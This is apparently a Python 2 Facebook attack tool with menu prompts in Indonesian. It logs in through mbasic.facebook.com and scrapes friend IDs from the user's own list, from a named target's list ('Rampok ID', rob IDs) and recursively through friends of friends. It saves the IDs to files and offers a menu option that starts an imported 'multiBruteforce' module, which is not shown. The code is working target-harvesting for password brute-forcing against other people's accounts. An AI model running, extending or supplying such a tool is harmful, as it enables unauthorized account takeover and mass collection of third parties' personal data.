import threading
import mechanize
import bs4,re,sys
import os
import requests
from data.color import *
from data import cache
from data import multiBruteforce
cache.cleanCache()

if (os.path.exists("out")):
	pass
else:
	os.mkdir("out")
	
class jamping:
	def __init__(self):
		self.i="https://mbasic.facebook.com/{}"
		self.req=requests.Session()
		self.login()
	
	def login(self):
		s=bs4.BeautifulSoup(
		self.req.get(
			self.i.format("login")).text,
		features="html.parser")
		for i in s("input"):
			if "login" in i["name"]:
				self.submit=i["value"]
		print("[%s*%s] Login your facebook ^^"%(C,N))
		login=self.req.post(
			self.i.format("login"),data=
				{
					"email":raw_input(
						"[%s*%s] Email: "%(G,N)),
					"pass":raw_input(
						"[%s*%s] Passs: "%(G,N)),
					"login":self.submit
				}
		).url
		if "save-device" in login or "m_sess" in login:
			print("[%s*%s] Login Success.."%(G,N))
			print("[%s*%s] Getting Friendlist ..."%(G,N,))
			self.tus()
		else:sys.exit('%s[!]%s Login Failed'%(R,N))
		
	def tus(self):
		req=bs4.BeautifulSoup(
		self.req.get(
			self.i.format("profile.php")).text,
		features="html.parser")
		for x in req.find_all("a",href=True):
			if "/friends?lst=" in x["href"]:
				bz=bs4.BeautifulSoup(
					self.req.get(self.i.format(x["href"])).text,
				features="html.parser")
				g=bz.find("h3").renderContents()
				p=re.findall("\((.*?)\)",g)[0]
				print("[%s*%s] %s"%(
					R,N,g))
				print("[%s*%s] MAX: %s"%(
					R,N,p.replace(".","")))
				self.many(self.i.format(x["href"]))
				exit()
				
	def many(self,url):
		try:
			self.man=input("[%s*%s] How many friends u want to jump? "%(G,N))
			print "[%s*%s] all dumped friendlist saved to out/ press ctrl+c to next"%(G,N)
			self.get(url)
		except:exit("%s[!]%s init is required."%(R,N))
		
	def get(self,url):
		self.bz=bs4.BeautifulSoup(
			self.req.get(url).text,
		features="html.parser")
		self.mek=[]
		while True:
			for x in self.bz.find_all("a",href=True):
				if "fref" in x["href"]:
					try:
						name=re.findall("/(.*?)\?fref",
							"%s"%(
								x["href"]))[0]
						self.mek.append(name)
						print("\r[%s*%s] GET: %s/%s ID"%(
							G,N,len(self.mek),self.man)
								),;sys.stdout.flush()
						if (len(self.mek) == self.man):
							self.dumpit(self.mek)
					except:pass
					try:
						profile=re.findall("php\?id=(.*?)&",
							"%s"%(x["href"]))[0]
						self.mek.append(profile)
						if (len(self.mek) == self.man):
							self.dumpit(self.mek)
					except:pass
				if "/friends?unit_cursor" in x["href"]:
					self.bz=bs4.BeautifulSoup(
						self.req.get(self.i.format(x["href"])).text,
					features="html.parser")
					break
					
	def dumpit(self,list):
		for x in list:
			try:
				self.DUMPS(x)
			except:continue
		os.system("killall python2")
		
	def DUMPS(self,arg):
		vs=bs4.BeautifulSoup(
			self.req.get(self.i.format(arg)).text,
		features="html.parser")
		mek=vs.find("title").renderContents()
		print "\n"+"-"*40+"\n[%s*%s] %s "%(G,N,mek)
		for x in vs.find_all("a",href=True):
			if "/friends?lst=" in x["href"]:
				try:
					self.gets(self.i.format(x["href"]),mek)
					break
				except:pass
				
	def gets(self,url,mek):
		bz=bs4.BeautifulSoup(
			self.req.get(url).text,
		features="html.parser")
		for x in bz.find_all("h3"):
			x=x.renderContents()
			p=re.findall("\((.*?)\)",x)[0]
			print("[%s*%s] friends: %s "%(
				G,N,p.replace(".","")))
			self.ter(url,p.replace(".",""),mek)
	
	def ter(self,url,p,mek):
		self.ji=bs4.BeautifulSoup(
			self.req.get(url).text,
		features="html.parser")
		wok=open("out/"+mek+".txt","w").close()
		while True:
			for x in self.ji.find_all("a",href=True):
				if "fref" in x["href"]:
					try:
						name=re.findall("/(.*?)\?fref",
							"%s"%(
								x["href"]))[0]
						s=open("out/"+mek+".txt").readlines()
						if len(s) == int(p):
							sys.exit()
						else:
							open("out/"+mek+".txt","a").write(name+"\n")
							print "\r[%s%s..%s] Written %s/%s  ctrl+c to next:)"%(G,mek[0:10],N,len(s),p),;sys.stdout.flush()
					except:pass
					try:
						profile=re.findall("php\?id=(.*?)&",
							"%s"%(x["href"]))[0]
						if len(s) == int(p):
							sys.exit()
						else:
							open("out/"+mek+".txt","a").write(profile+"\n")
					except:pass
				if "/friends?unit_cursor" in x["href"]:
					self.ji=bs4.BeautifulSoup(
						self.req.get(self.i.format(x["href"])).text,
					features="html.parser")
					break

class dumpper:
	def __init__(self,arg):
		self.arg=arg
		self.url="https://mbasic.facebook.com/{}"
		self.br=mechanize.Browser()
		self.br.set_handle_equiv(True)
		self.br.set_handle_robots(False)
		self.br.set_handle_redirect(True)
		self.br.open(self.url.format("login"))
		self.br._factory.is_html=True
		self.br.select_form(nr=0)
		print "[%s*%s] Login Your Facebook ^^"%(C,N)
		self.br.form["email"]="%s"%(
		raw_input("[%s*%s] Email: "%(G,N)))
		self.br.form["pass"]="%s"%(
		raw_input("[%s*%s] Passs: "%(G,N)))
		self.br.submit()
		br=self.br.geturl()
		if "save-device" in br or "m_sess" in br:
			print("[%s*%s] Login success."%(G,N))
			try:
				self.br.open(self.url.format(arg))
			except:sys.exit("%s[!] %sunknown id!"%(R,N))
			bs=bs4.BeautifulSoup(
				self.br.response().read(),
			features="html.parser")
			for x in bs.find_all("a",href=True):
				if "/friends?lst=" in x["href"]:
					self.main(x["href"])
		else:exit("%s[!]%s login failed."%(R,N))
		
	def main(self,urls):
		self.br.open(self.url.format(urls))
		brs=bs4.BeautifulSoup(
			self.br.response().read(),
		features="html.parser")
		for x in brs.find_all("h3"):
			xo=x.renderContents()
			px=re.findall("\((.*?)\)",xo)[0].replace(".","")
			self.xox=int(px)
		if self.arg == "profile.php":
			print "[%s+%s] Holla %s%s%s ^^"%(
			G,N,G,brs.find(
				"title").renderContents(),N)
			print "[%s+%s] Your friends: %s"%(R,N,self.xox)
			print "[%s*%s] Getting Friends ..."%(G,N)
		else:
			print "[%s+%s] Target Name: %s%s%s"%(G,N,
			R,brs.find(
				"title").renderContents(),N)
			print "[%s*%s] Her Friends: %s"%(G,N,self.xox)
			print "[%s*%s] Rob id ..."%(G,N)
				
		memex=[]
		open("aidi.txt","w").close()
		while True:
			k=bs4.BeautifulSoup(
				self.br.response().read(),
			features="html.parser")
			for x in k.find_all("a",href=True):
				if "fref" in x["href"]:
					if "profile.php" in x["href"]:
						pass
					else:
						xx=re.findall("/(.*?)\?",x["href"])[0]
						if xx in open("aidi.txt").read():
							pass
						else:
							open("aidi.txt","a").write(xx+"\n")
							memex.append(xx)
							try:
								print "\r[%s+%s] GET: %s id -> ctrl+c if number not running max "%(G,N,len(memex)),;sys.stdout.flush()
								if len(memex) == self.xox:
									exit()
							except:sys.exit("\n%s[!]%s User Interrupt!"%(R,N))
							
						
				if "/friends?unit_cursor" in x["href"]:
					self.kontl=x["href"]
					self.br.open(self.url.format(x["href"]))
					
					
class pilihan():
	def __init__(self):
		print "\n\t[ Select Actions ]\n"
		print "{%s01%s} Ambil ID Dari Teman anda"%(G,N)
		print "{%s02%s} Rampok ID dari teman target"%(G,N)
		print "{%s03%s} JUMPING"%(G,N)
		print "{%s04%s} Start Multi BruteForce\n"%(G,N)
		f=raw_input("%s[%s+%s]%s Actions>> "%(G,R,G,N))
		if f == "1" or f == "01":
			self.a()
		elif f == "2" or f == "02":
			self.b()
		elif f == "3" or f == "03":
			self.c()
		elif f == "4" or f == "04":
			self.d()
		else:sys.exit("%s[!]%s Invalid options!"%(R,N))
		
	def a(self):
		dumpper("profile.php")
		
	def b(self):
		rs=raw_input("[%s+%s] Target friends ID: "%(G,N))
		if rs == "":
			return self.b()
		dumpper(rs)
	
	def c(self):
		jamping()
		
	def d(self):
		multiBruteforce._prepares()
